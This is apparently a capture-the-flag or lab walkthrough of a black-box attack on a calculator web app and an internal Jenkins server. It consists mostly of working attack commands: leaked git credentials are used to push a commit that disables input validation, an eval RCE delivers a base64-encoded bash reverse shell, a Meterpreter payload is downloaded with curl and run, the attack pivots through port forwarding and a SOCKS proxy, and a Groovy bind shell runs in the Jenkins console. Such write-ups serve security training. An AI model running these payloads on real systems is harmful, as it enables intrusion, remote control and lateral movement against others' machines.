# BLACK BOX TESTING 2

## GIVEN   
**MY IP ADDRESS**: 192.32.59.2

## PROCEDURE

### RECON

```
nmap -A --script vuln -p- online-calc.com
```

![1.1](./imgs/1.1.png)

TARGET IP: 192.32.59.3

**OPEN PORTS**:<br>
80 http (Apache 2.4.29 Web Server),<br>
5000 http,<br>
8000 http (Python 2.7.17 Web Server)<br>

Port 80 is the default apache page<br>
Port 5000 is a calc webapp<br>
Port 8000 is hosting a git repo<br>

**FILE OF INTEREST**: http://online-calc.com:8000/.git/config

### GIT CREDENTIALS

```
curl http://online-calc.com:8000/.git/config
```

![2.1](./imgs/2.1.png)

name = Jeremy McCarthy<br>
email = jeremy@dummycorp.com<br>
**password** = diamonds<br>
**username** = jeremy<br>

**GIT UR**L: http://online-calc.com/projects/online-calc

### DISABLE INPUT VALIDATION

```
git clone http://online-calc.com/projects/online-calc
git log
```

![3.1](./imgs/3.1.png)

Webapp was vulnerable to RCE through the eval function

Find new code added to patch this vulnerability
```
git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 4bcfb590014321deb984237da2a319206975170f
```

![3.2](./imgs/3.2.png)

Comment out code in API.py:
```
# if not isValid(expr):
#	return error("Invalid expression!")
```

![3.3](./imgs/3.3.png)

Push changes to git repo
```
git add -A
git commit -m "updated"
git push origin
```

Check if webapp is updated
```
curl http://online-calc.com:8000/API.py
```

![3.4](./imgs/3.4.png)

### RCE REVERSE SHELL

Calc input is run through python eval function

Reverse shell bash script<br>
-c COMMAND<br>
-i interactive shell
```
bash -c 'bash -i >& /dev/tcp/192.32.59.2/1234 0>&1'
```

Reverse shell embedded in python code
```
__import__('os').system("bash -c 'bash -i >& /dev/tcp/192.32.59.2/1234 0>&1'")
```

Encode reverse shell
```
echo "bash -c 'bash -i >& /dev/tcp/192.32.59.2/1234 0>&1'" | base64
```

**ENCODED SCRIPT**:YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMzIuNTkuMi8xMjM0IDA+JjEnCg==

Final python script
```
__import__('os').system("echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMzIuNTkuMi8xMjM0IDA+JjEnCg== | base64 -d | bash")
```

Start listener
```
nc -lnvp 1234
```

Submit python script to calc app

![4.1](./imgs/4.1.png)

```
find / -iname *flag*
cat /tmp/flag
```

![4.2](./imgs/4.2.png)

**FLAG**: 3b2b474c06380f696b38c1498f795e054374

```
ip addr
```

Host connected to another network that we can pivot to:<br>
eth0: 192.32.59.3/24 (Current Network)<br>
**eth1**:192.244.194.2/24 (Unreachable Network)

![4.3](./imgs/4.3.png)

### METERPRETER

Create payload & start server<br>
-p PAYLOAD
-f FORMAT
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.32.59.2 LPORT=4444 -f elf > PAYLOAD
python3 -m http.server 80
```

Download payload on target machine
```
curl http://192.32.59.2/PAYLOAD > PAYLOAD
```

![5.1](./imgs/5.1.png)

Set up payload handler in metasploit
```
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.32.59.2
set LPORT 4444
exploit
```

Execute payload
```
chmod +x PAYLOAD
./PAYLOAD
```

![5.2](./imgs/5.2.png)

### PIVOT

Run port scan on other network
```
run autoroute -s 192.244.194.0/24
background
use auxiliary/scanner/portscan/tcp 
set RHOSTS 192.244.194.0/24
run
```

![6.1](./imgs/6.1.png)

**IP (OPEN PORT)**: 192.244.19.3 (8080)

Configure port forwarding and run nmap
```
sessions -i 1
portfwd add -l 5555 -p 8080 -r 192.244.194.3
background
nmap -sV -sC -p5555 localhost
```

![6.2](./imgs/6.2.png)

SERVICE: http (Jetty 9.4.27)

Start proxy server to access website
```
use auxiliary/server/socks_proxy
set SRVPORT 9050 #Default port for proxychains
set VERSION 4a
run
```

Test to see if we can access network
-Pn pingless scan (proxies don't support ping)
-sT tcp scan
```
proxychains nmap -sT -Pn 192.244.194.3
```

Configure proxy for browser:<br>
- Manual proxy config
- SOCKS Host: 127.0.0.1
- Port: 9050
- Socks v4

Website running Jenkins (automation server)

![6.3](./imgs/6.3.png)

### GETTING SHELL ACCESS

Go to Jenkins > Manage Jenkins > Script Console

Execute groovy bind script in the Script Console:
```
int port=6666;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Connect to the server
```
proxychains nc -v 192.244.194.3 6666
```

![7.1](./imgs/7.1.png)
